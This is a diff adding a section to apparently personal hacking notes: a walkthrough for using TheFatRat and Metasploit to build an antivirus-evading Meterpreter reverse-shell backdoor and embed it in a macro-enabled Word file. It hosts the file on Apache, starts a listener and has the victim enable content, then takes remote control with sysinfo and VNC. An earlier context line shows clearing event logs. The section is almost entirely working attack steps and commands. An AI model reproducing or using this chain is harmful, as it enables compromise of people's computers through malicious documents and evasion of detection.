@@ -105,7 +105,51 @@ meterpreter > getuid  [Server username: NT AUTHORITY\SYSTEM]
 > clearev [Clear logs]
 ---------------------------END-----------------
 
+-----------------------------------Hacking Windows with Malicious Office Document using TheFatRat------------------------------------
+Kali Linux
+> fatrat
+> choose [06] Create Fud Backdoor 1000% with PwnWindws [Excelent]
+> choose the [3] Create exe file with apache + Powershell (FUD 100%) 
+> Set the LHOST IP: Kali IP; LPORT: 4444 and the output: payload
+> chose [3] windows/meterpreter/reverse_tcp [Enter, fatrat will generate a payload.exe file located on /root/Fatrat_Generated/]
 
+~~~~Make a Malicious Word File
+> choose [9] Back to menu
+> choose the [07] Create Backdoor For Office with Microsploit
+> choose [2] The Microsoft Office Macro on Windows
+
+> LHOST IP: [Your Kali IP]
+> LPORT: 4444
+> Enter the base name for output files: <BadDoc>
+> Enter the message for the document body: you have been hacked :)
+> custom exe to file backdoor. Choose y for yes
+> path : /root/Fatrat_Generated/payload.exe
+> On the Payload Option, choose the [3] windows/meterpreter/reverse_tcp
+
+~~~~Set Up a Listener
+Open another Kali Linux terminal
+> msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST <kali_ip>
+> set LPORT 4444
+> run
+
+~~~~Share the Malicious Doc File
+Open another Kali Linux terminal
+> cp /root/Fatrat_Generated/BadDoc.docm /var/www/html/share/
+> service apache2 start
+
+~~Switch to Windows Machine
+open firefox http://<kali_ip>/share , download the BadDoc.docm and open. Enable Editing . Enable Content
+
+~~Switch back to Kali Machine where you had executed the msfconsole commands
+You will find that have a Meterpreter session open in the Metasploit terminal
+Type below commands to prove the hacking.
+meterpreter > sysinfo [should show the target systems information]
+meterpreter > run vnc [kick starts remote session]
+
+-----------------------------------------------------------------END--------------------------------------------------------------
 
 
 
